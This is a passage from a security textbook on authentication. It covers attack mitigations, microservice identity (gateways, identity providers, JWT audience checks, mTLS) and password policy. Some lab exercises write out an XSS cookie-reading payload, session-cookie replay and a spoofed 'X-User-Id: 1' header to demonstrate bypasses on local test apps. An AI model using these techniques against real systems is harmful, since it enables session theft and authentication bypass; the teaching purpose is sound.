| XSS | Output encoding, CSP, `HttpOnly` | 7.5, 12.8 |
| Clickjacking | `frame-ancestors 'none'` | 12.11 |
| Session fixation | New session ID on login | 7.8 |
| Session hijacking | TLS, `HttpOnly`+`Secure`, context binding, short TTL | 12.10 |
| Token theft via storage | In-memory access token, `HttpOnly` refresh cookie | 12.9 |
| IDOR | Per-resource authorization checks | 2.3, 3.6 |
| JWT `alg` confusion | Pin the algorithm on the verifier | 8.7 |
| User enumeration | Identical responses **and timings** for both failure modes | 11.11 |

---

## Chapter 12 Summary

- **TLS** provides confidentiality, integrity, and *server authentication* — the third being what actually stops MITM. It protects data in transit only.
- **Passwords need slow, memory-hard hashing** (Argon2id, BCrypt) with per-user salts; fast hashes like SHA-256 are correct for API keys and wrong for passwords, by a factor of ~300,000x.
- **Salt defeats rainbow tables and is not secret**; cost factor defeats brute force and must be raised over time.
- **Replay** needs nonce + timestamp (or idempotency keys) — TLS alone does not prevent it, and bearer tokens are inherently replayable.
- **Credential stuffing ≠ brute force**: per-account lockout barely touches stuffing; breached-password screening and MFA are what work.
- **CSRF** exists because cookies auto-attach; fix with `SameSite`, CSRF tokens, or header-based auth.
- **CORS is not a server-side protection** — it relaxes a browser restriction, is enforced only by browsers, and never substitutes for authentication.
- **XSS defeats every token-storage strategy.** `HttpOnly` prevents theft but not use. Preventing XSS matters more than choosing storage.
- **Most real credential leaks are operational** — URLs, logs, error reporters, git history — not cryptographic.
- **Security headers** (HSTS, CSP, `frame-ancestors`, `nosniff`, `Referrer-Policy`, `no-store`) are cheap and belong on every response.

---

## Interview Questions — Chapter 12

**Q1. What exactly does HTTPS protect against, and what does it not?**
It provides confidentiality and integrity in transit, plus authentication *of the server* via certificate validation — which is what defeats MITM. It does not protect data at rest, does not prevent a stolen token from being replayed over a valid TLS connection, does not stop XSS or CSRF, and does nothing if certificate verification is disabled or TLS terminates at a load balancer that then speaks plain HTTP internally.

**Q2. Why is SHA-256 acceptable for API keys but not for passwords?**
API keys are generated with 256 bits of entropy, so there is no feasible search space to brute-force — the hash's speed is irrelevant. Passwords are human-chosen, low-entropy, and heavily reused, so an attacker with the hash table brute-forces candidates offline at ~10 billion guesses/second against SHA-256. Argon2id/BCrypt make each guess deliberately expensive, cutting that to tens of thousands per second.

**Q3. What is the difference between a salt and a pepper?**
A salt is unique per user, stored in plaintext beside the hash, and defeats rainbow tables and cross-user hash correlation. A pepper is a single secret value stored *outside* the database (in application config or an HSM) and mixed in via HMAC — so a stolen database alone is not crackable. Salt is mandatory; pepper is an optional extra layer that must be rotatable and must never be lost.

**Q4. Does CORS make my API more secure?**
No. CORS relaxes the browser's Same-Origin Policy so specified origins may *read* your responses; it is enforced by browsers only. `curl`, Postman, mobile apps, and server-side clients ignore it entirely, and the request frequently reaches your handler even when the browser blocks the response. Authentication and authorization are what protect the API.

**Q5. Is it safer to store a JWT in `localStorage` or in a cookie?**
Neither is safe under XSS — that is the key insight. `localStorage` is readable by any injected script but immune to CSRF; an `HttpOnly` cookie is unreadable by script but CSRF-exposed and, critically, still *usable* by an XSS payload calling your API from your own origin. The common production answer is a split: refresh token in an `HttpOnly`, `Secure`, `SameSite=Strict` cookie scoped to the refresh path, access token held in memory only.

**Q6. How do you defend against credential stuffing specifically?**
Not with per-account lockout — a stuffing attack makes only one or two attempts per account, so lockout thresholds never trigger. The effective controls are screening passwords against known-breached lists at registration and password change, MFA, device/behaviour anomaly detection, and IP/ASN reputation-based rate limiting.

**Q7. What is a replay attack, and why doesn't TLS prevent it?**
An attacker re-sends a previously valid request to make its effect happen again. TLS prevents reading and tampering *in transit*, but if the attacker obtains the request another way — a log, a compromised proxy, a stolen bearer token — replaying it over a fresh, perfectly valid TLS connection works fine. Prevention requires request-level state: nonces with a timestamp window, short token lifetimes, or idempotency keys.

---

## Hands-On Exercises — Chapter 12

1. Run `openssl s_client -connect api.github.com:443 -tls1_3` and identify the certificate chain, the negotiated cipher suite, and the expiry date. Then try `-tls1` and observe the failure.
2. Benchmark it yourself: hash the same password 1,000 times with SHA-256 and 10 times with BCrypt(12), and compare wall-clock time. Compute how long a 10-billion-guesses-per-second GPU rig would need for each.
3. Build a deliberately vulnerable local page that renders user input with `innerHTML`, inject `<img src=x onerror=alert(document.cookie)>`, then add `HttpOnly` to the cookie and confirm it disappears from the alert. Then add a CSP and confirm the script no longer executes at all.
4. Using the Chapter 7 session app, capture a valid session cookie with `curl -c`, then replay it from a different terminal — confirm you are fully authenticated as that user, and explain why this is precisely why TLS is necessary but not sufficient.
5. Inspect a bank's or a major SaaS provider's response headers (`curl -I`) and check them against the section 12.11 table. Note which are present and which are missing.
6. Implement the nonce + timestamp verification from section 12.4, then write a test that captures a valid request and replays it — confirm the second attempt is rejected, and that a request 10 minutes old is rejected even with a fresh nonce.

## Mini Project — Chapter 12

Take the JWT books API from Chapter 8's mini project and perform a full **security hardening pass**, documenting each change against the attack it addresses.

Requirements:
- Argon2id (or BCrypt cost ≥ 12) password hashing, with rehash-on-login when the cost factor is raised.
- Layered rate limiting: per-IP and per-account, with exponential backoff and a `Retry-After` header.
- All six security headers from section 12.11, verified with `curl -I`.
- HTTPS locally with a self-signed certificate, plus an HTTP→HTTPS redirect — and confirm from the client side that certificate validation *fails* until you add the CA to the trust store. **Do not** solve it with `verify=False`.
- Identical response bodies *and* comparable response times for "unknown user" and "wrong password" — measure both and show the timings.
- A logging middleware that redacts `Authorization` and `Cookie` headers; prove it by triggering an error and inspecting the log.
- A written `SECURITY.md` mapping each control you implemented to the specific attack from section 12.12's table.

---

## Preparing for Chapter 13

Everything so far has assumed one application. Real systems are a dozen services behind a gateway, calling each other, each needing to know who the caller is. Chapter 13 covers authentication when there is no single "the server": API gateways, centralized identity providers (Keycloak, Auth0, Okta), token validation strategies at scale, and how services prove their identity to *each other* with mTLS.

---

*End of Chapter 12.*

---

# Chapter 13 — Authentication in Microservices

## 13.0 Where we left off

Every chapter so far assumed one application: one server, one user store, one place to check a credential. Real systems are not shaped like that. A single "view my order" click might traverse an API gateway, an order service, a user service, an inventory service, and a payment service — five processes, possibly in five languages, on five machines.

That breaks assumptions you have been quietly relying on:

- **Where does the user store live?** Five services cannot each own the password table.
- **Who validates the token?** Every service? The gateway? Both?
- **How does the *order* service prove to the *payment* service that it is really the order service?** There is no human and no browser in that call.
- **When a user is deleted, how do five independently-deployed services find out?**

This chapter answers those. Chapter 8's statelessness (section 8.12) is what makes it tractable, and this is the chapter where that property finally earns its keep.

---

## 13.1 The problem, drawn

```
   WHAT YOU HAD (Chapters 1-12)          WHAT YOU HAVE NOW

   ┌────────┐                          ┌──────────┐
   │ Client  │                          │  Client   │
   └───┬────┘                          └────┬─────┘
       │                                     │
   ┌───▼──────────┐                    ┌────▼──────────┐
   │  ONE app       │                    │  API Gateway   │
   │  - user store   │                    └────┬──────────┘
   │  - auth logic    │                ┌────────┼────────┬─────────┐
   │  - business logic │                ▼        ▼        ▼         ▼
   └────────────────┘             ┌──────┐ ┌──────┐ ┌──────┐ ┌───────┐
                                   │Order │ │User  │ │Inven-│ │Payment│
   One place to check              │ svc  │ │ svc  │ │tory  │ │  svc  │
   a credential. Simple.           └──┬───┘ └──────┘ └──────┘ └───┬───┘
                                       │                            │
                                       └────── calls ──────────────┘
                                        (who authenticates THIS?)
```

Two distinct authentication problems appear, and conflating them is the classic mistake:

| | **Edge authentication** | **Service-to-service authentication** |
|---|---|---|
| Who is calling | An end user (via browser/mobile) | Another one of your services |
| Credential | JWT / session / OAuth token | mTLS certificate, service token, SPIFFE identity |
| Question answered | "Which *user* is this?" | "Which *service* is this?" |
| Covered in | 13.2 – 13.6 | 13.7 – 13.9 |

You need both. A system with strong edge auth and no service-to-service auth is one compromised pod away from total access.

---

## 13.2 The API Gateway

**Simple explanation:** a single front door that every external request must pass through, where the cross-cutting concerns — authentication, rate limiting, routing, logging — happen once instead of in every service.

**Real-world analogy:** an office building's reception desk. You show ID once at reception and receive a visitor badge. Individual departments check the *badge*; they do not re-verify your passport, and they certainly do not each keep their own copy of the national ID database.

```
                        ┌──────────────────────────────┐
   Client ─────────────>│         API GATEWAY            │
   Authorization:       │                                │
     Bearer <JWT>       │  1. Terminate TLS               │
                        │  2. VALIDATE the JWT             │
                        │     (signature, exp, iss, aud)    │
                        │  3. Reject invalid -> 401          │
                        │  4. Rate limit per user/key         │
                        │  5. Inject verified identity into    │
                        │     internal headers                  │
                        └───────────┬──────────────────────┘
                                    │
                    X-User-Id: 8823  │  (internal headers, set by the
                    X-User-Roles: CUSTOMER │  gateway — see the warning below)
                                    │
                ┌───────────────────┼───────────────────┐
                ▼                   ▼                   ▼
          ┌──────────┐      ┌──────────┐       ┌──────────┐
          │ Order svc │      │ User svc  │       │ Inv. svc  │
          └──────────┘      └──────────┘       └──────────┘
```

**What belongs at the gateway:**
- TLS termination, and re-encryption for internal hops
- Token validation (signature, expiry, issuer, audience)
- Coarse rate limiting and quota enforcement
- Request routing, and stripping dangerous client-supplied headers

**What does *not* belong at the gateway:**
- Fine-grained, resource-specific authorization ("does user 8823 own order 451?"). Only the order service knows that — this is Chapter 3's split, at architecture scale.
- Business logic of any kind.

> **Common Mistake — the most dangerous one in this entire chapter.** If the gateway injects `X-User-Id: 8823` and each service simply trusts that header, then **any** party that can reach a service directly — a compromised pod, a developer with `kubectl port-forward`, a misrouted internal call — can send `X-User-Id: 1` and be an administrator. Chapter 2, section 2.8 said it plainly: *never trust client-supplied identity without verification*, and inside the cluster, "client" means "any other process."
>
> Two acceptable fixes: (a) the gateway **strips** these headers from all inbound traffic and the network guarantees nothing else can reach services directly (mTLS + network policy, section 13.8); or (b) services validate the JWT themselves rather than trusting a header — section 13.4. Option (b) is the safer default because it does not depend on network topology staying correct forever.

---

## 13.3 Centralized Identity — the Identity Provider

**Term defined — Identity Provider (IdP):** a dedicated system that owns user accounts, credentials, and login flows, and issues tokens that other systems trust. It is the Authorization Server from Chapter 9, promoted to a first-class piece of your architecture.

```
   ┌─────────────────────────────────────────────┐
   │  IDENTITY PROVIDER  (Keycloak / Auth0 / Okta) │
   │                                               │
   │  - Owns the user database and password hashes  │
   │  - Runs login, MFA, password reset, consent     │
   │  - Issues signed JWTs (RS256, Ch. 8.5)           │
   │  - Publishes public keys at /.well-known/jwks.json│
   │  - Handles social login (Google/GitHub, Ch. 10)    │
   └──────────────┬──────────────────────────────┘
                  │  tokens signed with the PRIVATE key
                  ▼
     ┌────────────┴─────────────┬──────────────┐
     ▼                          ▼              ▼
  Order svc                 User svc      Inventory svc
  (verifies with            (verifies)     (verifies)
   the PUBLIC key)

   NOTE: no service holds the signing key. A compromised service
   cannot mint tokens — only verify them. THIS is why RS256 exists.
```

This is where Chapter 8, section 8.5's HS256-vs-RS256 comparison stops being theoretical. With HS256, every service that verifies tokens holds the shared secret and could therefore **forge a token for any user**. With RS256, twelve services can verify and none can issue.

**The three you will actually encounter:**

| | Keycloak | Auth0 | Okta |
|---|---|---|---|
| Model | Open source, self-hosted | SaaS | SaaS, enterprise-focused |
| Cost | Free; you operate it | Per active user | Per user, enterprise pricing |
| Best for | Full data control, on-prem, regulated environments | Fast startup integration | Large-enterprise workforce identity |
| Standards | OIDC, OAuth 2.0, SAML | OIDC, OAuth 2.0, SAML | OIDC, OAuth 2.0, SAML |

All three speak the **same standard protocols from Chapters 9 and 10**. That is the real point: pick one, and if you integrate against the standards rather than the vendor SDK's conveniences, switching later is a configuration change rather than a rewrite.

> **Interview Tip:** *"Why use Keycloak instead of writing your own auth service?"* The strong answer is not "it's less work." It is: password reset flows, MFA, account lockout, breached-password screening, session management, token revocation, social login, SAML federation, and audit logging are each individually easy to get subtly wrong, and the cost of getting any one of them wrong is a breach. An IdP is a well-tested implementation of Chapters 5–12. Write your own only when you have a genuine requirement none of them meet.

---

## 13.4 Token validation strategies

Every service must decide *how* it checks an incoming token. There are three approaches, and the choice has real consequences.

**Strategy A — Local validation (stateless).** Each service verifies the signature itself using the IdP's public key.

```python
from jwt import PyJWKClient
import jwt

# Fetched ONCE at startup and cached; PyJWKClient handles refresh when
# the IdP rotates keys (a new "kid" appears in the token header).
jwk_client = PyJWKClient("https://idp.mycompany.com/.well-known/jwks.json",
                         cache_keys=True, lifespan=3600)

def validate(token: str) -> dict:
    signing_key = jwk_client.get_signing_key_from_jwt(token)
    return jwt.decode(
        token,
        signing_key.key,
        algorithms=["RS256"],                     # pinned — Ch. 8, section 8.7
        issuer="https://idp.mycompany.com",        # must be OUR IdP
        audience="order-service",                   # this token is FOR us
        options={"require": ["exp", "iat", "sub"]},
    )
```

- ✅ Fast (no network call), no single point of failure, scales linearly.
- ❌ Revocation is not immediate — a revoked token works until `exp`.

**Strategy B — Token introspection (stateful).** The service asks the IdP about every token (RFC 7662).

```http
POST /oauth2/introspect HTTP/1.1
Host: idp.mycompany.com
Authorization: Basic <service credentials>
Content-Type: application/x-www-form-urlencoded

token=eyJhbGciOiJSUzI1NiIs...

HTTP/1.1 200 OK
{"active": true, "sub": "8823", "scope": "orders.read", "exp": 1754392000}
```

- ✅ Immediate revocation — `"active": false` the instant a token is revoked.
- ❌ A network round-trip on **every** request; the IdP becomes a hard dependency and a bottleneck. Cache introspection results for a few seconds and you have re-created a smaller version of the same staleness problem.

**Strategy C — Hybrid (what most production systems do).**

```
   Gateway:   local signature validation  +  introspection/deny-list check
              (one place pays the revocation cost)
                     │
                     ▼  gateway re-signs or forwards the validated token
   Services:  local signature validation only
              (fast, and defence-in-depth against the header-trust
               problem from section 13.2)
```

| | Local | Introspection | Hybrid |
|---|---|---|---|
| Latency | Microseconds | +1 network hop | Hop at the edge only |
| Revocation lag | Up to token TTL | Immediate | Seconds |
| IdP as a dependency | No | Yes, on every request | At the edge only |
| Use when | Short-lived tokens (5–15 min) | Immediate revocation is mandatory | Most real systems |

> **Remember:** the entire revocation debate reduces to the access-token TTL. At 15 minutes, local validation exposes a 15-minute window — acceptable for most applications, and Chapter 8, section 8.10 already made this argument. If your compliance requirements say revocation must be instant, that is a requirement for introspection (or very short TTLs with a fast refresh loop), not a preference.

---

## 13.5 Token propagation between services

When the order service calls the payment service, what does it send?

```
   ❌ PATTERN 1 — Drop identity entirely
      Order svc ──[ no credential ]──> Payment svc
      Payment service has no idea who the user is. Cannot enforce
      per-user rules. Anything that reaches it is trusted. Never do this.

   ⚠️ PATTERN 2 — Forward the user's token as-is (token passthrough)
      Order svc ──[ Authorization: Bearer <user's token> ]──> Payment svc
      Simple, and the user's identity flows end to end. But: every
      downstream service now holds a token with the user's FULL scope,
      and any one of them could call anything the user can. Acceptable
      inside a trust boundary; risky across one.

   ✅ PATTERN 3 — Token exchange (RFC 8693)
      Order svc ──> IdP: "here is the user's token; give me one scoped
                          only to payment.charge, audience=payment-svc"
      Order svc ──[ Authorization: Bearer <narrow token> ]──> Payment svc
      Least privilege (Chapter 14) applied to service calls. More moving
      parts, and an IdP round-trip.

   ✅ PATTERN 4 — Two credentials: service identity + user context
      Order svc ──[ mTLS cert proves "I am order-svc"         ]──> Payment svc
                   [ Authorization: Bearer <user token> proves
                     "acting on behalf of user 8823"           ]
      The payment service can enforce BOTH: is order-svc allowed to call
      me at all, AND is user 8823 allowed to make this charge. This is
      the model most mature systems land on.
```

```python
# Propagating the caller's identity — plus a trace ID, so one user
# journey is followable across every service log (section 13.10).
async def call_payment_service(user_token: str, trace_id: str, charge: dict):
    async with httpx.AsyncClient(
        # mTLS: our client certificate proves WHICH SERVICE is calling (13.8)
        cert=("/etc/certs/order-svc.pem", "/etc/certs/order-svc.key"),
        verify="/etc/certs/ca.pem",
    ) as client:
        return await client.post(
            "https://payment-svc.internal/charges",
            headers={
                "Authorization": f"Bearer {user_token}",   # WHO the user is
                "X-Trace-Id": trace_id,                     # correlate the journey
            },
            json=charge,
        )
```

> **Common Mistake:** forwarding the user's access token to a **third-party** or lower-trust service. The token is a bearer credential (Chapter 4, section 4.4) — whoever holds it can use its full scope against any service that accepts it. Crossing a trust boundary is exactly where token exchange (Pattern 3) stops being over-engineering.

---

## 13.6 The `aud` claim — the check that makes multi-service tokens safe

Chapter 8, section 8.11 mentioned audience validation in passing. In microservices it becomes essential, so here is the concrete failure it prevents.

```
   WITHOUT aud validation:

   1. User gets a token for the low-privilege "public-api" service.
   2. Attacker takes that token and presents it to "admin-service".
   3. admin-service checks: signature valid? ✅ (same IdP)  not expired? ✅
      -> ACCEPTS IT. A token minted for one service just worked on another.

   WITH aud validation:

   3. admin-service checks: aud == "admin-service"?
      Token says aud = "public-api"  ->  ✗ REJECTED.
```

Each service must validate that `aud` names *itself*. This costs one line and closes a whole class of lateral-movement attack:

```python
jwt.decode(token, key, algorithms=["RS256"],
           audience="order-service",              # ← this line
           issuer="https://idp.mycompany.com")
```

---

## 13.7 Service-to-service authentication

The user-facing token answers "which user?" It does not answer "which service is calling me?" — and inside a cluster, that second question is what stops a single compromised container from becoming a full breach.

| Approach | How it works | Verdict |
|---|---|---|
| **Nothing / network trust** | "It's the internal network, it's fine" | The assumption that fails first. A single compromised pod owns everything. |
| **Shared secret / API key** | Each service holds a static key (Ch. 6) | Workable but static: hard to rotate, easy to leak, shows up in env dumps |
| **Client credentials grant** | Service gets a short-lived token from the IdP (Ch. 9, section 9.6) | Good. Standard, short-lived, centrally revocable. |
| **mTLS** | Both sides present certificates | Strongest. Identity is cryptographic and tied to transport. |
| **SPIFFE/SPIRE** | Automated workload identity + short-lived certs | mTLS with the certificate-lifecycle problem solved |

**Client credentials in practice** — the same flow from Chapter 9, section 9.6, now with a purpose:

```python
# The order service authenticates AS ITSELF (no user involved).
async def get_service_token() -> str:
    async with httpx.AsyncClient() as client:
        r = await client.post("https://idp.mycompany.com/oauth2/token", data={
            "grant_type": "client_credentials",
            "client_id": "order-service",
            "client_secret": os.environ["ORDER_SVC_SECRET"],   # from a secrets manager
            "scope": "payment.charge inventory.reserve",         # least privilege
        })
    return r.json()["access_token"]   # cache until shortly before exp
```

---

## 13.8 mTLS — mutual TLS

**Simple explanation:** normal TLS (Chapter 12, section 12.1) verifies the *server's* identity to the client. Mutual TLS makes it symmetric — the client also presents a certificate, so each side cryptographically proves who it is.

```
   NORMAL TLS                          MUTUAL TLS

   Client            Server            Client            Server
     │                 │                 │                 │
     │ ClientHello ──> │                 │ ClientHello ──> │
     │ <── cert ────── │                 │ <── cert ────── │
     │ verify server ✅ │                 │ verify server ✅ │
     │                 │                 │ ─── cert ────>  │
     │                 │                 │                 │ verify client ✅
     │ <══ encrypted ══>                 │ <══ encrypted ══>

   Server knows nothing               BOTH sides know exactly
   about who the client is.           who the other is.
```

**Why it fits service-to-service so well:** identity is bound to the transport itself. There is no bearer token to steal and replay — an attacker would need the client's *private key*, which never leaves the workload. The certificate's subject *is* the service identity:

```
   Subject: CN=order-service.production.svc.cluster.local
```

**In practice you do not hand-roll this.** A service mesh (Istio, Linkerd) injects a sidecar proxy that terminates mTLS transparently, issues and rotates short-lived certificates automatically, and enforces policy — with no application code change:

```yaml
# Istio — require mTLS for all traffic in the namespace
apiVersion: security.istio.io/v1beta1
kind: PeerAuthentication
metadata:
  name: default
  namespace: production
spec:
  mtls:
    mode: STRICT        # reject any plaintext connection

---
# ...and authorize by service identity, not by IP address
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: payment-service-access
  namespace: production
spec:
  selector:
    matchLabels:
      app: payment-service
  rules:
    - from:
        - source:
            # ONLY the order service may call payment service. Anything
            # else in the cluster is refused at the transport layer.
            principals: ["cluster.local/ns/production/sa/order-service"]
      to:
        - operation:
            methods: ["POST"]
            paths: ["/charges"]
```

> **Remember:** certificate *lifecycle* is the hard part of mTLS, not the cryptography. Expired certificates cause complete, sudden outages, and manually rotating dozens of them does not scale. This is the actual reason to adopt a mesh or SPIFFE/SPIRE rather than issuing certificates by hand — automated, short-lived (hours, not years) certificates.

---

## 13.9 The complete picture

```
   ┌────────┐
   │ Browser │
   └───┬────┘
       │  ① OIDC login (Ch. 10) — user authenticates AT THE IdP
       │     and receives id_token + access_token (RS256)
       ▼
   ┌─────────────────┐         ┌──────────────────────────┐
   │  API GATEWAY      │◄───────│  IDENTITY PROVIDER          │
   │                   │  JWKS   │  (Keycloak / Auth0 / Okta)   │
   │ ② validate JWT     │  public │  - owns users + passwords     │
   │    sig/exp/iss/aud │  keys   │  - issues RS256 tokens         │
   │ ③ rate limit        │         │  - never shares the private key │
   │ ④ strip client-set   │         └──────────────────────────┘
   │    X-* headers        │
   └────────┬─────────────┘
            │  ⑤ forward the ORIGINAL token (not a trusted header)
            │
   ╔════════▼═══════════════ mTLS everywhere inside ════════════╗
   ║                                                              ║
   ║   ┌────────────┐        ⑥ mTLS + user token      ┌─────────┐ ║
   ║   │ Order svc   │ ────────────────────────────────>│ Payment │ ║
   ║   │             │  cert proves "I am order-svc"     │  svc     │ ║
   ║   │ ⑦ validates  │  token proves "for user 8823"     │          │ ║
   ║   │   token      │                                   │ validates│ ║
   ║   │   LOCALLY    │                                   │  BOTH    │ ║
   ║   │   (aud=order)│                                   │          │ ║
   ║   └────────────┘                                   └─────────┘ ║
   ╚══════════════════════════════════════════════════════════════╝

   Trust summary:
     - The IdP is the ONLY thing that can create a valid user token.
     - Every service verifies independently; none can forge.
     - Service identity comes from mTLS, user identity from the JWT.
     - No service trusts a plain header from anyone.
```

---

## 13.10 Operational concerns you will actually hit

- **Clock skew.** JWT validation compares `exp` and `nbf` against local time. A server whose clock drifts by minutes rejects valid tokens (or accepts expired ones). Run NTP everywhere, and allow a small `leeway` (30–60 seconds) in validation.
- **Key rotation.** The IdP rotates its signing keys. Services must fetch JWKS dynamically and key off the token header's `kid`, caching with a sane TTL. A hardcoded public key turns rotation into an outage.
- **Distributed tracing.** Propagate a trace ID (`traceparent`, or `X-Trace-Id`) on every internal call. Without it, debugging "this user got a 403 somewhere" across seven services is guesswork — you cannot tell *which* service denied it.
- **Cascading auth failures.** If the IdP goes down: local validation keeps working until tokens expire (a strong argument for Strategy A), but nobody can log in or refresh. Plan the degradation explicitly.
- **Token size.** JWTs with many roles/permissions grow past typical 8 KB header limits and get silently truncated by proxies. Keep claims minimal; look permissions up by user ID rather than embedding all of them.
- **Log correlation, not credential logging.** Log the `sub` and `jti`, never the token. Chapter 12, section 12.10.

---

## Chapter 13 Summary

- Microservices split authentication into two distinct problems: **edge authentication** (which user?) and **service-to-service authentication** (which service?). Both are required.
- The **API Gateway** centralizes TLS termination, token validation, and rate limiting — but not fine-grained authorization, which only the owning service can perform.
- **Never trust an injected identity header** (`X-User-Id`) without either network guarantees or independent token validation — it is Chapter 2's "never trust client-supplied identity" at cluster scale.
- A centralized **Identity Provider** (Keycloak/Auth0/Okta) owns credentials and issues **RS256** tokens; services hold only the public key and therefore cannot forge tokens.
- **Local validation** is fast and resilient but has revocation lag bounded by the token TTL; **introspection** gives instant revocation at the cost of a per-request dependency; most systems use a **hybrid**.
- Validating the **`aud` claim** in every service prevents a token minted for one service from being replayed against another.
- **Token propagation** options range from passthrough (simple, wide blast radius) to token exchange (least privilege) — cross a trust boundary and exchange becomes necessary.
- **mTLS** binds service identity to the transport, removing the stealable bearer credential; certificate *lifecycle* is the hard part, which is why meshes and SPIFFE exist.
- Operational reality — clock skew, key rotation, trace IDs, token size — causes more incidents than cryptography does.

---

## Interview Questions — Chapter 13

**Q1. Where should JWT validation happen — the gateway, each service, or both?**
Both, in most designs. The gateway validates to reject bad traffic early and to handle revocation checks in one place; each service validates independently (signature, `exp`, `iss`, and crucially its own `aud`) so that it does not depend on the gateway being the only possible caller. Gateway-only validation means anything that reaches a service directly — a compromised pod, a port-forward, a routing mistake — is implicitly trusted.

**Q2. Why is RS256 essentially mandatory in a microservices architecture?**
Because HS256 uses one shared secret for both signing and verifying, so every service that needs to *verify* a token would hold the power to *forge* one for any user. RS256 splits this: the IdP holds the private key and is the only thing that can issue tokens, while any number of services hold only the public key and can verify but never mint.

**Q3. What is the risk of a gateway injecting `X-User-Id` and services trusting it?**
The header becomes a complete authentication bypass for anything that can reach a service directly. A compromised container, a developer's port-forward, or a misconfigured route can send `X-User-Id: 1` and act as an administrator. Mitigate by having services validate the original token themselves, and by enforcing mTLS plus network policy so that only the gateway can reach services.

**Q4. Local validation or introspection?**
Local validation for speed, resilience, and scale — accepting that a revoked token stays usable until it expires. Introspection when immediate revocation is a hard requirement, accepting an IdP round-trip on every request. Most systems use short-lived access tokens (5–15 minutes) with local validation, plus revocation enforced at the refresh-token layer — the same trade-off argued in Chapter 8, section 8.10.

**Q5. What does mTLS give you that a bearer token does not?**
Identity bound to the transport and to a private key that never leaves the workload, rather than to a string that anyone who obtains it can replay. A stolen JWT works from anywhere; a stolen mTLS *identity* requires the private key. It also authenticates both directions, so the caller knows it reached the real service and not an impostor inside the network.

**Q6. Why validate the `aud` claim?**
Without it, a token issued for a low-privilege service is accepted by a high-privilege one — same issuer, valid signature, unexpired — enabling lateral movement. Each service checking that `aud` names itself confines a token to its intended recipient.

---

## Hands-On Exercises — Chapter 13

1. Run Keycloak locally (`docker run -p 8080:8080 quay.io/keycloak/keycloak start-dev`), create a realm, a client, and a user, then obtain a token with the password grant and decode it — identify `iss`, `aud`, `exp`, and the realm roles.
2. Fetch Keycloak's `/.well-known/openid-configuration` and then its `jwks_uri`. Verify a real token's signature using only the public key, with no shared secret anywhere.
3. Build two FastAPI services where service A calls service B forwarding the user's token. Then deliberately have B skip `aud` validation, and demonstrate that a token minted for A is accepted by B.
4. Set up mTLS between two local services with self-signed certificates (`openssl req`/`openssl x509`). Confirm the call succeeds with a client certificate and fails without one.
5. Simulate the header-trust vulnerability: build a service that trusts `X-User-Id`, then call it directly with `curl -H "X-User-Id: 1"` bypassing the gateway. Then fix it by validating the JWT in the service.
6. Take a service down mid-flow and observe what happens to in-flight authenticated requests. Write up how your system degrades when the IdP is unavailable.

## Mini Project — Chapter 13

Build a **three-service system with centralized identity**.

Requirements:
- **Keycloak** (Docker) as the IdP, with two realm roles: `CUSTOMER` and `ADMIN`.
- **Gateway service** — validates the JWT (signature via JWKS, `exp`, `iss`, `aud`), rate limits per `sub`, strips all inbound `X-*` identity headers, and routes to the two services below.
- **Order service** — independently validates the token with `aud=order-service`; `GET /orders` returns only the caller's own orders (a resource-specific authorization check the gateway cannot make).
- **Payment service** — accepts calls **only** from the order service, verified by a client-credentials service token or mTLS, *and* requires a valid user token for the on-behalf-of identity.
- Demonstrate all of the following with `curl`: a valid end-to-end call; a call with no token (401); a `CUSTOMER` token on an admin route (403); a token with the wrong `aud` (401); and a direct call to the order service bypassing the gateway, proving it still rejects an unauthenticated request.
- A written architecture note stating which credential answers "which user" and which answers "which service" at every hop.

---

## Preparing for Chapter 14

You now know every mechanism and every architecture this book set out to cover. Chapter 14 is the distillation: the operational practices — password policy, token lifetimes, rotation, least privilege, secrets management, logging, monitoring, audit trails — that separate a system that is *correct on paper* from one that stays secure in production for years.

---

*End of Chapter 13.*

---

# Chapter 14 — Best Practices

## 14.0 Where we left off

Chapters 5–13 taught mechanisms. This chapter is about the decisions *around* those mechanisms — the ones that do not show up in a tutorial because they only matter after your system has been running for two years, has real users, and has had its first incident.

A useful framing: everything up to now was *"is my authentication correct?"* This chapter is *"will my authentication still be correct in two years, under a team that has changed, with credentials that have rotated, and can I prove what happened when someone asks?"*

Each section states the practice, the reason, and the concrete number or configuration where one exists — because "use strong passwords" is advice nobody can act on, while "screen against a breached-password list, minimum 12 characters, no forced rotation" is.

---

## 14.1 Password policy — most conventional advice is wrong

Modern guidance (NIST SP 800-63B) overturned decades of habit. The rules below are what current standards actually say, and several will contradict what your organization's policy document says.

| ✅ Do | ❌ Don't | Why |
|---|---|---|
| Minimum **12 characters** (8 absolute floor) | Require uppercase + digit + symbol | Composition rules produce `Password1!` — predictable, and attackers model these patterns |
| Allow **at least 64 characters**, all Unicode, spaces included | Cap length at 16, or strip characters | Long passphrases are stronger and easier to remember; truncation silently weakens them |
| **Screen against breached-password lists** | Rely on complexity rules | This is the single highest-value check — it is what actually stops credential stuffing (Ch. 12, section 12.5) |
| Change **only on evidence of compromise** | Force rotation every 90 days | Forced rotation causes `Summer2024!` → `Summer2025!` and drives password reuse |
| Support **password managers** (allow paste) | Block paste "for security" | Blocking paste pushes users toward short, typed, reused passwords |
| Offer **MFA** | Treat MFA as optional forever for admins | MFA defeats the entire credential-theft class |
| Provide a strength **meter** as feedback | Hard-block on a strength score | Guidance helps; a rigid score frustrates and gets gamed |

```python
import hashlib
import httpx

async def is_password_breached(password: str) -> bool:
    """Check a password against Have I Been Pwned using k-anonymity.

    Only the FIRST FIVE characters of the SHA-1 hash are sent. The service
    returns every hash suffix sharing that prefix (~800 entries) and we match
    locally — so the password, and even its full hash, never leave the server.
    """
    sha1 = hashlib.sha1(password.encode()).hexdigest().upper()
    prefix, suffix = sha1[:5], sha1[5:]

    async with httpx.AsyncClient(timeout=3.0) as client:
        resp = await client.get(f"https://api.pwnedpasswords.com/range/{prefix}")

    for line in resp.text.splitlines():
        candidate, count = line.split(":")
        if candidate == suffix:
            return int(count) > 0
    return False


async def validate_password(password: str, email: str, name: str) -> None:
    if len(password) < 12:
        raise ValueError("Password must be at least 12 characters")
    if len(password) > 128:
        raise ValueError("Password must be at most 128 characters")   # DoS guard, not a security cap

    lowered = password.lower()
    if email.split("@")[0].lower() in lowered or name.lower() in lowered:
        raise ValueError("Password must not contain your name or email")

    if await is_password_breached(password):
        raise ValueError(
            "This password has appeared in a known data breach. Please choose a different one."
        )
```

